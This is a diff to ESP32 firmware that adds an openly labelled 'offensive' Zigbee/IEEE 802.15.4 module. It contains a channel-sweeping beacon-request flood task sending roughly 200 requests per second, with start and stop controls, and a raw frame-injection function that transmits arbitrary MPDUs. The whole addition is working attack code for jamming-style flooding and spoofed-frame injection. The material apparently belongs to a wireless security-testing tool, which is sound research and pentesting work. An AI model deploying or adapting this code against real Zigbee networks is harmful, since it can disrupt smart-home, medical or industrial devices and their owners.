@@ -399,3 +399,88 @@ int ieee802154_sniff_get(uint8_t *buf, int cap)
     xSemaphoreGive(s_lock);
     return 1 + n * (int)sizeof(m1_rpc_zb_device_t);
 }
+
+/* ======================================================================== */
+/*  Offensive TX — beacon-request flood + raw inject                        */
+/*  Share the single radio with the sniffer; flood_start parks the sniffer   */
+/*  first so only one owner drives the PHY at a time. TX works while RX is    */
+/*  armed (esp_ieee802154_receive), exactly as the sniff-time prober does.    */
+/* ======================================================================== */
+
+#define ZB_FLOOD_STACK  3072       /* bytes (ESP-IDF xTaskCreate takes bytes) */
+
+static volatile bool    s_flood_running;
+static volatile uint8_t s_flood_ch;        /* 0 = sweep 11-26 */
+static TaskHandle_t     s_flood_task;       /* NULLed by the worker just before exit */
+
+static void flood_task(void *arg)
+{
+    (void)arg;
+    uint8_t ch = ZB_CH_MIN;
+    while (s_flood_running) {
+        uint8_t c = s_flood_ch ? s_flood_ch : ch;
+        esp_ieee802154_set_channel(c);
+        esp_ieee802154_receive();          /* arm RX so the TX path is live on this ch */
+        for (int i = 0; i < 20 && s_flood_running; i++) {
+            send_beacon_request();
+            vTaskDelay(pdMS_TO_TICKS(5));   /* ~200 req/s per dwell */
+        }
+        if (!s_flood_ch && ++ch > ZB_CH_MAX) ch = ZB_CH_MIN;
+    }
+    s_flood_task = NULL;
+    vTaskDelete(NULL);
+}
+
+esp_err_t ieee802154_flood_start(uint8_t channel)
+{
+    if (!s_lock) s_lock = xSemaphoreCreateMutex();
+
+    /* Take the radio away from the sniffer (parks the hopper, sleeps its RX). */
+    ieee802154_sniff_stop();
+
+    /* Let a previous flood worker fully exit before reusing the handle/flag. */
+    for (int i = 0; i < 120 && s_flood_task != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(5));
+    if (s_flood_task != NULL) return ESP_ERR_INVALID_STATE;
+
+    if (!radio_ensure_enabled()) {
+        ESP_LOGE(TAG, "flood: radio enable failed");
+        return ESP_FAIL;
+    }
+    esp_ieee802154_set_channel(channel ? channel : ZB_CH_MIN);
+    esp_ieee802154_receive();
+
+    s_flood_ch = channel;
+    s_flood_running = true;
+    if (xTaskCreate(flood_task, "zb_flood", ZB_FLOOD_STACK, NULL, 5, &s_flood_task) != pdPASS) {
+        s_flood_running = false;
+        return ESP_ERR_NO_MEM;
+    }
+    ESP_LOGI(TAG, "flood start ch=%u", channel);
+    return ESP_OK;
+}
+
+esp_err_t ieee802154_flood_stop(void)
+{
+    s_flood_running = false;
+    for (int i = 0; i < 120 && s_flood_task != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(5));
+    if (s_radio_enabled)
+        radio_sleep();                     /* hand the antenna back to WiFi/BLE */
+    ESP_LOGI(TAG, "flood stop");
+    return ESP_OK;
+}
+
+esp_err_t ieee802154_inject(const uint8_t *mpdu, uint8_t len)
+{
+    if (!mpdu || len < 1 || len > 125) return ESP_ERR_INVALID_ARG;
+    if (!radio_ensure_enabled())        return ESP_FAIL;
+
+    /* Driver frame format: [0] = PSDU length (MPDU + 2-byte FCS the HW appends). */
+    uint8_t f[128];
+    f[0] = (uint8_t)(len + 2);
+    memcpy(&f[1], mpdu, len);
+
+    esp_ieee802154_receive();              /* arm RX so the TX path is live */
+    return esp_ieee802154_transmit(f, false);
+}
